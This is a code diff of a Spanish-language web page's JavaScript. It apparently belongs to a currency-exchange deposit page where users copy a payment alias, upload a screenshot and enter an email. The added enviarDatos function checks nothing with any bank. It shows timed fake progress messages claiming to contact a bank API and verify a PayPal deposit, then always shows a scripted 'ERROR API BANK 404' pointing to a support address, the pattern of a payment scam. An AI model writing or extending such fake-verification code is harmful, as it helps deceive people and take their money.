@@ -60,18 +60,28 @@
         <button class="btn" onclick="enviarDatos()">Enviar</button>
     </div>
     <script>
-         window.onload = function() {
-            abrirVentana();
-        };
-
-       
         function enviarDatos() {
-            var captura = document.getElementById("captura").files[0];
-            var correo = document.getElementById("correo").value;
+    var captura = document.getElementById("captura").files[0];
+    var correo = document.getElementById("correo").value;
+    var correoRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-            // Aquí puedes enviar los datos a tu servidor o realizar las acciones necesarias con los datos.
-            // Por ejemplo, puedes usar AJAX para enviar estos datos a un script en tu servidor.
-        }
+    // Validar el formato del correo y la existencia de la captura
+    if (correoRegex.test(correo) && captura) {
+        mostrarMensaje("Procesando datos...");
+        setTimeout(function () {
+            mostrarMensaje("Conectando con API Bank ...");
+            setTimeout(function () {
+                mostrarMensaje("Comprobando Depósito Bancario / Paypal...");
+                setTimeout(function () {
+                    mostrarError("Depósito fallido ERROR API BANK 404 ref(err404-40001eRttU) Soporte usdexchange@support.ex.com.ar");
+                }, 1000);
+            }, 4000);
+        }, 7000);
+    } else {
+        mostrarError("Por favor, ingrese un correo válido y suba una imagen.");
+    }
+}
+
          function copiarAlias() {
             var alias = document.getElementById("alias");
             alias.select();
